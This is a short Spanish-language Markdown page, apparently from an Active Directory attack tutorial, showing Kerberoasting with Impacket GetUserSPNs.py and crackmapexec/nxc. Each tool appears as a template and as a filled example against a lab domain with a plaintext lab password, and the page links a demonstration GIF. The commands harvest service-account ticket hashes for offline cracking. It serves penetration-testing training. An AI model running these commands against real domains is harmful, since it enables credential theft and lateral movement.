# Obtener usuarios kerberoasteables

```Bash
# Obtención de hash de usuarios con el SPN habilitado
python /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip <DC ip> <nombre dominio completo>/<user>:<pass> -outputfile kerberoasting.hashes

GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes

# Hash con crackmapexec
crackmapexec ldap <IP ldap> -u '<user>' -p '<pass>' -d <nombre dominio completo> --kerberoasting <output file>

nxc ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING


```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/kerberoasting/files/vid.gif?raw=true "Obteniendo hashes de usuarios con SPN habilitado")
